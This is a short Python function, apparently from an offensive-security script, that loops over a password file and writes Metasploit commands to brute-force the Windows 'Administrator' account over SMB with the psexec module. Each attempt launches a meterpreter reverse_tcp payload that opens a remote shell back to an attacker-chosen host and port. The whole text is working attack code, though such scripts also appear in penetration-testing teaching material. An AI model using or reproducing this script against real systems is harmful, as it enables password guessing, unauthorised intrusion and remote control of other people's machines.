def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
	username = 'Administrator'
	pF = open(passwdFile,'r')
	for password in pF.readlines():
		password = password.strip('\n').strip('\r')
		configFile.write('use exploit/windows/smb/psexec\n')
		configFile.write('set SMBUser ' + str(username) + '\n')
		configFile.write('set SMBPass ' + str(password) + '\n')
		configFile.write('set RHOST ' + str(tgtHost) + '\n')
		configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT ' + str(lport) + '\n')
		configFile.write('set LHOST ' + lhost + '\n')
		configFile.write('exploit -j -z\n')